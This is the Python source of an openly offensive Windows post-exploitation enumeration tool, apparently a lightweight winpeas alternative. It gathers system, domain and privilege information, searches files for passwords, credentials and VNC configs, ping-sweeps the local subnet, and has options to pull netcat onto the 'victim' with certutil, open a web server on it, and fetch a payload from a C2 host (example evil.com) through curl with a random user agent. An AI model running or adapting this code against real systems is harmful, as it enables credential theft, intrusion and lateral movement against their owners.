
# ============================================== #
# POST EXPLOITATION ENUMERATION TOOL FOR WINDOWS #
# 					         @34ZY  									   #
#    VERSION 2	| Lateral movements	friendly		 #
# ============================================== #

import os
import time
import socket
import sys
from random import random
import msvcrt
import subprocess

# -nc Download netcat on target
# -srv open python webserver on victim machine
# -get download payload from your C2


# Class of different styles
class style():
    BLACK = '\033[30m'
    RED = '\033[31m'
    GREEN = '\033[32m'
    YELLOW = '\033[33m'
    BLUE = '\033[34m'
    MAGENTA = '\033[35m'
    CYAN = '\033[36m'
    WHITE = '\033[37m'
    UNDERLINE = '\033[4m'
    RESET = '\033[0m'



# ============================================== #
# BANNER
# ============================================== #

def banner():
	print(style.CYAN + '\n<'+ style.WHITE+ '[' + style.CYAN + '[ '+ style.UNDERLINE + style.YELLOW + 'Very LITE alternative to winpeas' + style.RESET + style.CYAN +' ]' + style.WHITE + ']' + style.CYAN + '>')
	print(style.RED + "\r[!]" + style.CYAN + " info : This version of NVRAB, must be running in new windows terminal!")
	print(style.YELLOW + r''' 
----------------------------------------------------------------------------
|          .--,_    \     🐰    |  \ <<Version>>  /   |    \  <<System>> / |
|         / ,/ /\    \    💙    |   \  > 2.0 <   /    |     \ >Windows< /  |
|        / // /\ \    \----------------------------------------------------|
|       / // /_\\|                                                         |
|     .'  ' (                                                              |
|    /__    \.-"""-._                                                      |
|   / 0>  ' .    '    `-.          <<ɴᴇʀᴠ0ᴜs ʀ4ʙʙɪᴛ>>                      |
|  (       .  '      "   `.                                                |      
|   `/─-.-'     "       '  ;       <<Pᴏsᴛ Exᴘʟᴏɪᴛᴀᴛɪᴏɴ Eɴᴜᴍᴇʀᴀᴛɪᴏɴ ᴛᴏᴏʟ>>  |
|   /   `.'  "  .  .-'    " ;      <<author : @34ZY>>                      |
|  ~     : .     .'          ;                                             |
|        `.   ' :     '   '  ;     Option : -h (show help section)         |
|          )  _.". "     .  ";..                                           |
|        .'_.'   .'   '  __.,   `\                                         |
|       '"      ""''---'`    "''"`                                         |
----------------------------------------------------------------------------
		''')


# ============================================== #
# Progress bar
# ============================================== #

animation = "|/-\\"



def New_prompt():
	os.system("cmd.exe")

# ============================================== #
# WEBSERVER 
# ============================================== #

def Web_server():

	port = input(style.YELLOW + "[*]" + style.WHITE + " Specify port on the web server : ")

	hostname = socket.gethostname()
	local_ip = socket.gethostbyname(hostname)
	print(style.MAGENTA + '[$]' + style.WHITE + f' R4bbit found your local ip adress : {local_ip}')
	
	print(style.CYAN + '[$]' + style.WHITE + f' R4bbit serving webserver on : {local_ip}:{port}')
	time.sleep(1)

	os.system(f"python -m http.server {port}")

# =============================================== #
# GET C2 PAYLOAD 
# =============================================== #

def Get_payload():


	#RANDOM USER AGENT
	random_string = random()
	
	is_proxy = input(style.CYAN + "[?]" + style.WHITE + " Is there a proxy (Y/N) : ")

	if (is_proxy == "N"):

		url_C2 = input(style.YELLOW + "[*] " + style.WHITE + "Specify C2 Url (Ex: https://www.evil.com) : ")
		filename = input(style.YELLOW + "[*] " + style.WHITE + "Specify payload filepath (Ex: /usr/evil/exploit.js) : ")
		
		print(style.GREEN + '[+]' + style.WHITE + ' Rabbit is trying to get the payload ...')
		#Sending request NO PROXY
		os.system(f'curl --silent -o nul "{url_C2}/{filename}" --ssl-no-revoke -A "{random_string}"')
		print(style.GREEN + '[+]' + style.WHITE + ' Rabbit is terminating the transfer.')

	elif (is_proxy == "Y"):
		
		url_C2 = input(style.YELLOW + "[*] " + style.WHITE + "Specify C2 Url (Ex: https://www.evil.com) : ")
		filename = input(style.YELLOW + "[*] " + style.WHITE + "Specify payload filepath (Ex: /usr/evil/exploit.js) : ")
		#IF PROXY
		PROXY_IP = input(style.YELLOW + "[*] " + style.WHITE + "Specify your proxy IP : ")
		PROXY_PORT = input(style.YELLOW + "[*] " + style.WHITE + "Specify your proxy PORT : ")
		USER = input(style.YELLOW + "[*] " + style.WHITE + "Specify your proxy auth Username : ")

		print(style.YELLOW + "[*] " + style.WHITE + "Specify your proxy auth Password : ")
		PASS = input(style.YELLOW + "[*] " + style.WHITE + "Specify your proxy auth Password : ")
		
		print(style.RED + '[$]' + style.WHITE + ' Rabbit is trying to get the payload ...')
		#Sending request TROUGH proxy
		os.system(f'curl --silent -o nul -x {PROXY_IP}:{PROXY_PORT} -U {USER}:{PASS} "{url_C2}/{filename}" --ssl-no-revoke -A "{random_string}"')
		print(style.GREEN + '[+]' + style.WHITE + ' Rabbit is terminating the transfer.')
	else:

		print(style.RED + "[!]" +style.WHITE+ " An error occuried during the input proxy please type (Y or N)")



# ============================================== #
# Enumeration process
# ============================================== #


def Enum_system():

	try :
		THREADS = input(style.GREEN + '[-)' + style.WHITE + ' Choose number of threads (1.5s by default) : ')
		#print(THREADS)

		if THREADS == '':
			THREADS = '1.5'
			print(style.YELLOW + '\n\n[*]' + style.WHITE + f' Threads set to default ({THREADS} seconds)')
			time.sleep(1)
			print(style.RED +'[!]' + style.WHITE + ' R4bbit is hungry and try to get new friends ...')
			THREADS = 1.5
		else : 
			print(style.GREEN + '[+]' + style.WHITE + f' R4bbit setting threads set to {THREADS} seconds.')
			time.sleep(1)
			THREADS = int(float(THREADS))

		LOCAL_USERNAME = os.getlogin()

		print(style.BLUE + '[*]' + style.WHITE + f' R4bbit found local user is : {LOCAL_USERNAME}')
		time.sleep(1)
		print(style.YELLOW + '[+]'  + style.WHITE +' R4bbit try to find some infos reliated to this windo system ...\n')
		time.sleep(1)
		subprocess.call('systeminfo' , stdout=sys.stdout, shell=True)
		time.sleep(THREADS)
		print(style.UNDERLINE +'\n--------------------------------------------------------------------------' + style.RESET)
		print(style.GREEN + '\n[+]' +style.WHITE +' R4bbit try to watch if are there TCP open ports ...\n')
		time.sleep(0.5)
		subprocess.call('netstat -ano|findstr /i tcp|findstr /i LISTENING', stdout=sys.stdout, shell=True)
		time.sleep(THREADS)
		print(style.UNDERLINE +'\n--------------------------------------------------------------------------'+ style.RESET)
		print(style.GREEN + '\n[+]' + style.WHITE + ' R4bbit check if this account have any interesting privilege ...\n')
		time.sleep(0.5)
		subprocess.call(f'net user /domain {LOCAL_USERNAME}', stdout=sys.stdout, shell=True)
		time.sleep(THREADS)
		
		print(style.UNDERLINE +'\n--------------------------------------------------------------------------'+ style.RESET)
		print(style.GREEN + '\n[+]' + style.WHITE + ' R4bbit check more infos about the Domain Controller ...\n')
		time.sleep(1)
		subprocess.Popen('powershell.exe [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()', stdout=sys.stdout)
		#print(p)
		time.sleep(THREADS)
		time.sleep(1)

		print(style.UNDERLINE +'\n--------------------------------------------------------------------------'+ style.RESET)
		print(style.GREEN + '\n[+]' + style.WHITE + ' R4bbit check for juicy files containing passwords ...\n')
		time.sleep(1)
		os.system('dir /a /s *pass* == *cred* == *vnc* == *.config* == *proof.txt* == *local.txt*')
		print(style.GREEN + '\n[+]' + style.WHITE + ' Text files ...\n')
		os.system('findstr /si password *.txt')
		print(style.GREEN + '\n[+]' + style.WHITE + ' XML files ...\n')
		os.system('findstr /si password *.xml')
		print(style.GREEN + '\n[+]' + style.WHITE + ' ini files ...\n')
		os.system('findstr /si password *.ini') 
		#os.system('findstr /spin "password" *.*')
		print(style.GREEN + '\n[+]' + style.WHITE + ' ultravnc files ...\n')
		os.system('dir c:*ultravnc.ini /s /b')
		print(style.GREEN + '\n[+]' + style.WHITE + ' vnc files ...\n')
		os.system('dir c:\\ /s /b | findstr /si *vnc.ini')
		#print(style.GREEN + '\n[+]' + style.WHITE + ' default installation files ...\n')
		#os.system('type C:\\unattend.xml, C:\\sysprep.inf, C:\\sysprep\\sysprep.xml')
		#subprocess.Popen('', stdout=sys.stdout)
		#print(p)
		time.sleep(THREADS)
		time.sleep(1)

		print(style.UNDERLINE +'\n--------------------------------------------------------------------------' + style.RESET)
		print(style.GREEN + '\n[+]' + style.WHITE + ' R4bbit is checking interesting running services ...\n')
		time.sleep(0.5)
		subprocess.call('wmic service get name,displayname,pathname,startmode |findstr /i "Auto" | findstr /i /v "C:\\Windows"', stdout=sys.stdout, shell=True)
		print(style.UNDERLINE +'\n--------------------------------------------------------------------------'+ style.RESET)
		time.sleep(THREADS)
		print(style.GREEN + '\n[+]' + style.WHITE + ' R4bbit is checking installed applications ...\n')
		time.sleep(0.5)
		subprocess.call('wmic product get name,version,vendor', stdout=sys.stdout, shell=True)
		print(style.UNDERLINE +'\n--------------------------------------------------------------------------'+ style.RESET)
		time.sleep(THREADS)
		print(style.GREEN + '\n[+]' + style.WHITE + ' R4bbit is checking network interface configuration ...\n')
		time.sleep(0.5)
		subprocess.call('ipconfig /all', stdout=sys.stdout, shell=True)
		print(style.UNDERLINE +'\n--------------------------------------------------------------------------'+ style.RESET)
		time.sleep(THREADS)
		print(style.GREEN + '\n[+]' + style.WHITE + f' R4bbit is checking {LOCAL_USERNAME} permissions and groups ...\n')
		time.sleep(0.5)
		subprocess.call('whoami /priv /groups', stdout=sys.stdout, shell=True)
		print(style.UNDERLINE +'\n--------------------------------------------------------------------------'+ style.RESET)
		time.sleep(THREADS)
		print(style.GREEN + '\n[+]' + style.WHITE + ' R4bbit is checking local network status ...')
		time.sleep(1)
		print(style.GREEN +'[+]' + style.WHITE +' R4bbit is getting ip addresses ...')
		time.sleep(1.2)
		hostname = socket.gethostname()
		local_ip = socket.gethostbyname(hostname)
		print(style.MAGENTA + '[$]' + style.WHITE + f' R4bbit found your local ip adress : {local_ip}')
		time.sleep(0.5)
		local_ip = '.'.join(local_ip.split('.')[:-1]) # Replace last byte from ip adress
		print(style.GREEN + '[+]' + style.WHITE +' R4bbit is asking for new friends in this network ...\n')
		time.sleep(1)

		i = 0
		staussum = 0
		time.sleep(THREADS)
		subprocess.call(f'arp -a|findstr /i {local_ip}', stdout=sys.stdout, shell=True)
		print(style.UNDERLINE +'\n--------------------------------------------------------------------------'+ style.RESET)

		print(style.GREEN +'\n[+]'+ style.WHITE + ' R4bbit try to ping his friends ... ')
		print(style.CYAN +'[?]' + style.WHITE + ' R4bbit is slow be patient ... <(O__O)> \n')

		f=open("Hosts.txt", "w")

		for i in range(0,256,1):

			sys.stdout.write(style.CYAN + "\r" + animation[i % len(animation)])
			sys.stdout.flush()
			status = os.system(f'ping -n 1 -w 200 {local_ip}.' + f'{i} > nul && echo  ʕɔ•_•ʔɔ [$] New friend found : {local_ip}.' + f'{i}')
			time.sleep(THREADS)

		print(style.RED +'\n[!]' + style.WHITE +' R4bbit is now trying to find HIDDED friends (^ₒ^c) ...')
		time.sleep(2)
		print(style.UNDERLINE +'\n--------------------------------------------------------------------------'+ style.RESET)
		os.system(f'arp -a')
		print(style.UNDERLINE +'\n--------------------------------------------------------------------------'+ style.RESET)
		print(style.RED +'\n[!]'+ style.WHITE +' R4bbit is sleepy. Going home now ... <(─__─")>')
		time.sleep(1)
		print(style.YELLOW +'[*]'+ style.WHITE +' Enjoy thoses juicy infos :3')
		time.sleep(0.3)
		print(style.GREEN + '[+]' + style.WHITE + ' R4bbit finished to fetch this system.')

	except KeyboardInterrupt:
    		print(style.RED + '''\n🛑 ''' + style.WHITE + "R4bbit is hidding ...")

# ============================================== #
# MAIN 
# ============================================== #

def main():
	banner()
	#New_prompt()


	if len(sys.argv) > 1:
		result = sys.argv[1]
	else:
		result = False

	if result == False:

		print(style.YELLOW + '[?]' + style.WHITE + ' No argument specified set to : default enumeration')
		Enum_system()

	else:

		if result == "-nc":

			print(style.RED + '[*]' + style.WHITE + ' Are you sure to import netcat executable on this machine ? (y/N)')
			validate = input(style.GREEN + '[-) R4bbit > '+ style.WHITE + '')

			validate = ord(validate)

			if(validate == ord('y')):
				print(style.GREEN + '[+]' + style.WHITE + ' Downloading Netcat from source ...')
				#https://github.com/diegocr/netcat/blob/master/nc.exe
				time.sleep(2)
				subprocess.Popen('powershell.exe certutil.exe -urlcache -f https://github.com/diegocr/netcat/blob/master/nc.exe', stdout=sys.stdout)

			elif(validate == ord('Y')):
				print(style.GREEN + '[+]' + style.WHITE + ' Downloading Netcat from source ...')
				#https://github.com/diegocr/netcat/blob/master/nc.exe
				time.sleep(2)
				subprocess.Popen('powershell.exe certutil.exe -urlcache -f https://github.com/diegocr/netcat/blob/master/nc.exe', stdout=sys.stdout)
				
		
			elif(validate == ord('N')):
				Enum_system()
			
			#MANAGE if user dont put any of these y or n

		
			elif(validate == ord('n')):
				Enum_system()

			else:
				print(style.RED + '[!]' + style.WHITE + "Don't try to play with rabbit next time just tell YES or NO ?")


		elif result == "-srv":
			Web_server()


		elif result == "-get":
			Get_payload()

		elif result == "-h":

			print('''
  OPTIONS :
     		 
     -> No options will enumerate exploitable windows processes
         
     -nc  download netcat for the victim from internet [Unavailable yet]
     -srv open python webserver on victim machine
     -get download payload from your C2

				''')
		else:
			print(style.RED + '[!]' + style.WHITE + "Wrong argument specified.")

	
if __name__ == '__main__':
	main()